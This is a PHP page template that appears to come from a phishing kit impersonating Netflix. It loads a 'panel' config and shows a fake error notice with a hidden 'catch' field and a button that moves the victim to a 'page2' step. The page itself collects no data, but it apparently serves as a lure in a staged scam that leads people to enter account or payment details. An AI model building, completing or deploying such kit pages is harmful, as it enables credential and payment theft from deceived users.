<?php
require_once 'config/panel.php';
$title = "Netflix";
ob_start();
?>

<div class="w-100 d-flex flex-column justify-content-center align-items-center">
     <form class="container my-3 carda shadow rounded-3" action="index.php?<?= md5(time()) ?>" method="post">
     <input type="hidden" name="catch">

     <div class="w-100 d-flex justify-content-start my-4">
     <img style="width: 50px;" src="assets/images/error_icon.svg" alt="" srcset="">
     </div>
     <h1 class="mb-4 p-0"><?= lang("xexpl1"); ?></h1>


 
 <p style="font-size: 13px;color:#fff;"><?= lang("xexpl2"); ?></p>
 <p style="font-size: 13px;color:#fff;"><?= lang("xexpl3"); ?></p>

 <div class="w-100 d-flex justify-content-end align-items-center mt-5">
         <button class="btn btn-danger w-100 m-0 p-0" type="submit" name="submit" value="page2"><?= lang("xexpl4"); ?></button>
         </div>


</form>

</div>
<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout_dash.php' ?>